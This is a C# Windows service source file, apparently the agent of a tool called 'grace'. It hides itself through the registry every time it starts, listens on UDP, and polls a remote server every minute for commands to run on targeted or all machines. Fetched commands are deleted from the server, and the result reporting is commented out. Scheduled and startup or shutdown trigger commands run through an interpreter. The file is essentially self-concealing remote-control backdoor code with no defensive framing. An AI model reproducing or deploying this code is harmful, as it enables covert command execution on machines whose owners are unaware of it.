using grace;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Web.Script.Serialization;

namespace grace_soul
{
    public partial class Service1 : ServiceBase
    {
        private System.Timers.Timer _timer_scheduler, /*_timer_trigger,*/ _timer_runTotal;
        private schedule sch_to_run = null;
        private static ulong elapsedMinutes = 0;
        private static int totalRanNumber = 0;

        public Service1()
        {
            InitializeComponent();
            //Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo("en-GB");
            //Thread.CurrentThread.CurrentUICulture = new System.Globalization.CultureInfo("en-GB");
            CultureInfo.DefaultThreadCurrentCulture = new CultureInfo("en-US");
            CultureInfo.DefaultThreadCurrentUICulture = new CultureInfo("en-US");            
        }

        #region Command Classes
        public class Commands
        {
            public Command[] commands { get; set; }
        }
        public class Command
        {
            public string id { get; set; }
            public string text { get; set; }
            public string forWhom { get; set; }
        }
        #endregion
        #region Log Classes
        public class Log
        {
            public string text { get; set; }
            public string from { get; set; }
            public string dateTime { get; set; }
        }
#endregion

        private void RunTrigger(string sTriggerName, string sTriggeParameter)
        {
            try
            {
                if (cls_Scheduler.scheduleList != null && cls_Scheduler.scheduleList.Count > 0)
                {
                    List<schedule> schedulesMatch = cls_Scheduler.FindATrigger(sTriggerName, sTriggeParameter);
                    if (schedulesMatch != null && schedulesMatch.Count > 0)
                    {
                        cls_Utility.Log("** Triggers which match the event \'" + sTriggerName + "\' with parameter \'" + sTriggeParameter + "\' are :" + schedulesMatch.Count);
                        foreach (schedule sch in schedulesMatch)
                        {
                            cls_Utility.Log("** Trigger service command: \r\n--" + sch.schedule_command);
                            object result = cls_Interpreter.RunACommand(sch.schedule_command, null);
                            if (result != null)
                                cls_Utility.Log("\r\n" + result);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                cls_Utility.Log("! Error on checking trigger \'onstartup\'." + ex.Message);
            }
        }

        protected override void OnStart(string[] args)
        {
            cls_Network.SetupUDPServer();
            try
            {
                cls_Scheduler.SchedulerLoad();
                cls_Utility.Log("** Scheduler loaded OnStart().");
            }
            catch (Exception ex)
            {
                cls_Utility.Log("! Error on loading scheduler file. " + ex.Message);
            }            

            try
            {
                _timer_scheduler = new System.Timers.Timer();
                _timer_scheduler.Interval = 1 * 60 * 1000; //every 1 Minute
                _timer_scheduler.Elapsed += new System.Timers.ElapsedEventHandler(_timer_scheduler_Elapsed);
                _timer_scheduler.Start();

                cls_Utility.Log("** Scheduler Start................. OK");
            }
            catch (Exception ex)
            {
                cls_Utility.Log("! Error on starting _timer_scheduler." + ex.Message);
            }


            try
            {

                if (cls_Scheduler.IsThereAnyTrigger())
                {                    
                    // Trigger: 'onstartup' event
                    #region OnStartup
                    RunTrigger("{@onstartup@}", "");
                    #endregion
                }
            }
            catch (Exception ex)
            {
                cls_Utility.Log("! Error on starting _timer_trigger." + ex.Message);
            }

            try
            {
                // Make sure to hide, everytime the service runs
                cls_System.cls_Registry.HideMe();
            }
            catch(Exception ex)
            {
                cls_Utility.Log("! Cannot hide" + ex.Message);
            }
        }

        protected override void OnStop()
        {
            // Trigger: 'onshutdown' Checking
            #region OnShutdown
            RunTrigger("{@onshutdown@}", "");
            #endregion
        }

        private void SaveLogToTheServer(string s_fromAddress, string s_log)
        {
            Log httpLog = new Log();
            httpLog.from = s_fromAddress;
            httpLog.text = s_log;

            string json = new JavaScriptSerializer().Serialize(httpLog);
            var httpContent = new StringContent(json, Encoding.UTF8, "application/json");

            string JSON_response = cls_Network.Http_POST("api/logs/", httpContent).Result;
            if (JSON_response != null)
                cls_Utility.Log("\r\n" + "Http Log saved successfully.");
        }

        private void DeleteHTTPCommand(Command command)
        {
            #region Deleting the just fetched commands
            string JSON_response = cls_Network.Http_DELETE("api/commands/" + command.id).Result;
            if (JSON_response != null)
                cls_Utility.Log("\r\n" + "Fetched Http command [" + command.id + "] deleted successfully.");
            #endregion
        }

        private string RunHTTPCommand(Command command)
        {
            #region Running fetched command(s)
            cls_Utility.Log("\r\n" + "Http command(s) [" + command.id + "] running: ");
            object result = cls_Interpreter.RunACommand(command.text, null);
            if (result != null)
            {
                cls_Utility.Log("\r\n" + result);
            }

            return result.ToString();
            //string[] lines = command.text.Split(new char[] { ';' });
            //foreach(string line in lines)
            //{
            //    object result = cls_Interpreter.RunACommand(line, null);
            //    if (result != null)
            //    {

            //        cls_Utility.Log("\r\n" + result);
            //    }
            //}            
            #endregion
        }

        private void AddCommandToHistory(Command command)
        {
            #region Adding command(s) to History
            cls_Utility.Log("\r\n" + "Deleted Http command(s) [" + command.id + "] added to history successfully.");
            #endregion
        }

        private void _timer_scheduler_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            #region Resetting log file
            try
            {
                if (DateTime.Now.ToString("HH:mm") == "00:00" || DateTime.Now.ToString("HH:mm") == "09:00" || DateTime.Now.ToString("HH:mm") == "12:00")
                {
                    cls_Utility.ClearLogFile();
                }
            }
            catch {}
            #endregion

            try
            {
                #region Connecting to and running GET from API "grace.khaledr.ir/api/commands"
                string JSON_data = cls_Network.Http_GET("api/commands").Result;

                if (JSON_data != null)
                {                    
                    Commands commands = new JavaScriptSerializer().Deserialize<Commands>(JSON_data);                    

                    if (commands != null)
                    {
                        foreach (Command command in commands.commands)
                        {
                            string localhostAddress = "";                            
                            if (command.forWhom != "{@all@}") //if forWhom is an IP
                            {                                
                                if (cls_Network.ValidateIPv4(command.forWhom))
                                {
                                    IPAddress ip = cls_Network.cls_IPTools.GetLocalActiveIP(cls_Network.pingableIPAddress, cls_Network.PORT);
                                    localhostAddress = ip.ToString();
                                }
                                else
                                {
                                    localhostAddress = cls_System.GetLocalComputerName();
                                }

                                // Run the command only if it is for this computer
                                if (localhostAddress == command.forWhom)
                                {
                                    DeleteHTTPCommand(command);
                                    AddCommandToHistory(command);

                                    string s_fromAddress = cls_System.GetLocalComputerName();
                                    try
                                    {
                                        s_fromAddress += " | " + cls_Network.cls_IPTools.GetLocalActiveIP(cls_Network.pingableIPAddress, cls_Network.PORT).ToString();
                                    }
                                    catch { }

                                    //cls_Utility.SaveLogToTheServer(s_fromAddress, RunHTTPCommand(command));
                                }
                                else { /*if the command is not for this workstation nothing happens*/ }

                            }
                            else // if forWhom == {@all@}
                            {
                                DeleteHTTPCommand(command);
                                AddCommandToHistory(command);

                                string s_fromAddress = cls_System.GetLocalComputerName();
                                try
                                {
                                    s_fromAddress += " | " + cls_Network.cls_IPTools.GetLocalActiveIP(cls_Network.pingableIPAddress, cls_Network.PORT).ToString();
                                }
                                catch { }

                                //cls_Utility.SaveLogToTheServer(s_fromAddress, RunHTTPCommand(command));
                            }
                        }

                    }
                }
                else
                {
                    //cls_Utility.Log("\r\n" + "TIK: No Https command found.");
                }
                #endregion

            }catch(Exception)
            {
                //cls_Utility.Log("! Error - Service1. Connecting to HTTP server faild. " + ex.Message);
            }

            elapsedMinutes++;

            try
            {
                _timer_runTotal = new System.Timers.Timer();                
                _timer_runTotal.Elapsed += new System.Timers.ElapsedEventHandler(_timer_runTotal_Elapsed);
                _timer_runTotal.Stop();
            }
            catch(Exception ex)
            {
                cls_Utility.Log("! Error - Service1. Init run total schedule failed. " + ex.Message);
            }
            //cls_Utility.Log("** Scheduler 1 Minute Tik(elapsed:"+elapsedMinutes.ToString()+")................. OK");
            //if (elapsedMinutes % 4/*randomEveryNSecond*/ < .3f)
            //{
            //    cls_Utility.Log("** every 4 minutes@@@@@@@@@@@");
            //}

            #region Loading Schedules 
            try
            {
                cls_Scheduler.scheduleList = null;
                cls_Scheduler.SchedulerLoad();                
            }
            catch (FileNotFoundException)
            {
                
            }
            catch(Exception ex)
            {
                cls_Utility.Log("! Error - Service1. Loading schedules failed. " + ex.Message);
            }
            #endregion

            #region Checking schedules that match
            if (cls_Scheduler.scheduleList != null && cls_Scheduler.scheduleList.Count > 0)
            {
                DateTime now = DateTime.Now;

                List<schedule> schedulesMatch = cls_Scheduler.FindASchedule(now.ToString(), elapsedMinutes);
                if (schedulesMatch != null && schedulesMatch.Count > 0)
                {
                    cls_Utility.Log("** Schedules which match the time " + now.ToString("yyyy/MM/dd") + " " + now.ToString("HH:mm") + " are :" + schedulesMatch.Count);
                    foreach (schedule sch in schedulesMatch)
                    {
                        cls_Utility.Log("** Scheduler (Total run: \'" + sch.schedule_runTotal + "\') service command: \r\n--" + sch.schedule_command);

                        //if(sch.schedule_runTotal > 1)
                        //{
                            //cls_Utility.Log("** Scheduler (with more than 1) service command: \r\n--" + sch.schedule_command);

                        sch_to_run = sch;

                        if (sch.schedule_runTotal <= 0) sch.schedule_runTotal = 1;
                       
                        _timer_runTotal.Interval = (1 * 60 * 1000) / sch.schedule_runTotal; //total divided by 1 minute
                        _timer_runTotal.Start();
                        //cls_Utility.Log("runtotal timer interval: " + _timer_runTotal.Interval.ToString());
                        _timer_runTotal_Elapsed(null, null);
                        //}
                    }
                }
            }
            #endregion
        }

        private void _timer_runTotal_Elapsed(object senderr, ElapsedEventArgs ee)
        {
            object result = cls_Interpreter.RunACommand(sch_to_run.schedule_command, null);
            if (result != null)
                cls_Utility.Log("\r\n" + result);

            totalRanNumber++;
            if (totalRanNumber >= sch_to_run.schedule_runTotal)
            {
                _timer_runTotal.Stop();
                totalRanNumber = 0;
                return;
            }
        }

        private void _timer_trigger_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            // Trigger: 'OnWindowActivate' event
            #region OnWindowActivate
            //string sTitle = cls_System.GetActiveWindowTitle();
            //cls_Utility.Log("Active Window Title : " + sTitle);
            //RunTrigger("{@onwindowactivate@}", sTitle);
            #endregion



            // Trigger: 'OnProccess' event
            #region OnProcess
            RunTrigger("{@onprocess@}", "");
            #endregion



            // Trigger: 'OnRightClick' event
            #region OnRightClick


            #endregion



            // Trigger: 'OnLeftClick' event
            #region OnLeftClick


            #endregion


            //if (cls_Scheduler.scheduleList.Count > 0)
            //{                
            //    List<schedule> schedulesMatch = cls_Scheduler.FindASchedule(now.ToString(), elapsedMinutes);
            //    if (schedulesMatch != null && schedulesMatch.Count > 0)
            //    {
            //        cls_Utility.Log("** Schedules which match the time " + now.ToString("yyyy/MM/dd") + " " + now.ToString("HH:mm") + " are :" + schedulesMatch.Count);
            //        foreach (schedule sch in schedulesMatch)
            //        {
            //            cls_Utility.Log("** Scheduler service command: \r\n--" + sch.schedule_command);
            //            object result = cls_Interpreter.RunACommand(sch.schedule_command, null);
            //            if (result != null)
            //                cls_Utility.Log("\r\n" + result);
            //        }
            //    }
            //}
        }

        private bool trigger_onprocess(string s_procName)
        {
            Process found = cls_System.GetLocalComputerProcesses().Find(item => item.ProcessName.Contains(s_procName));
            if (found != null)
            {
                return true;
            }

            return false;
        }
    }
}
